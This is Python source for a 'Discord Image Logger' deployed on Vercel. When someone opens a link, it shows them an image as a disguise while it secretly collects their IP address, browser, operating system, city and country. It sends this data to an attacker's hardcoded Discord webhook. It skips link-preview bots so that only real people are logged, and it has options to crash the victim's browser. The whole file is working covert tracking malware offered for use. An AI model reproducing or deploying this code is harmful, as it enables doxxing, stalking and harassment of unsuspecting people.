# Discord Image Logger - Vercel Optimized
# Original By DeKrypt | Optimized for Vercel deployment

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1468596714674847906/R-fGy4wS7cFJhHt_eOOitXH0km65IlbNMP4ySEBKm48vIZjWk8DKPRPuRTArisEOcPID",
    "image": "https://i.postimg.cc/bvLrJzfg/1770189806.jpg", 
    "imageArgument": True, 

    # CUSTOMIZATION #
    "username": "Image Logger", 
    "color": 0x00FFFF, 

    # OPTIONS #
    "crashBrowser": False, 
    "accurateLocation": False, 
    "message": { 
        "doMessage": False, 
        "message": "This browser has been pwned by DeKrypt's Image Logger.", 
        "richMessage": True, 
    },
    "vpnCheck": 1, 
    "linkAlerts": True, 
    "buggedImage": True, 
    "antiBot": 1, 

    # REDIRECTION #
    "redirect": {
        "redirect": False, 
        "page": "https://your-link.here" 
    }
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if not ip: return False
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json = {
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{"title": "Image Logger - Error", "color": config["color"], "description": f"```\n{error}\n```"}]
        })
    except: pass

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if not ip or ip.startswith(blacklistedIPs): return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json = {
                "username": config["username"],
                "embeds": [{"title": "Image Logger - Link Sent", "color": config["color"], "description": f"**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`"}]
            })
        return

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        if info.get("proxy") and config["vpnCheck"] == 2: return
        if info.get("proxy") and config["vpnCheck"] == 1: ping = ""
        
        os, browser = httpagentparser.simple_detect(useragent if useragent else "")
        
        embed = {
            "username": config["username"],
            "content": ping,
            "embeds": [{
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"**IP:** `{ip}`\n**City:** `{info.get('city', 'Unknown')}`\n**Country:** `{info.get('country', 'Unknown')}`\n**VPN:** `{info.get('proxy')}`\n**OS:** `{os}`\n**Browser:** `{browser}`"
            }]
        }
        if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
        requests.post(config["webhook"], json = embed)
    except Exception as e:
        reportError(traceback.format_exc())

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Vercel에서 실제 IP 가져오기
            ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
            useragent = self.headers.get('user-agent', '')
            
            url = config["image"]
            if config["imageArgument"]:
                dic = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
                if dic.get("url"):
                    try: url = base64.b64decode(dic.get("url")).decode()
                    except: pass

            if botCheck(ip, useragent):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]: 
                    self.wfile.write(base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'))
                makeReport(ip, useragent, endpoint=self.path, url=url)
                return
            
            else:
                makeReport(ip, useragent, endpoint=self.path, url=url)
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                
                # 위장용 이미지 출력 HTML
                data = f'<html><body style="margin:0;padding:0;"><img src="{url}" style="width:100vw;height:100vh;object-fit:contain;"></body></html>'
                self.wfile.write(data.encode())

        except Exception:
            reportError(traceback.format_exc())
            self.send_response(500)
            self.end_headers()

    do_POST = do_GET

# Vercel이 인식할 핸들러 지정 (이게 없으면 404가 뜹니다)
handler = ImageLoggerAPI
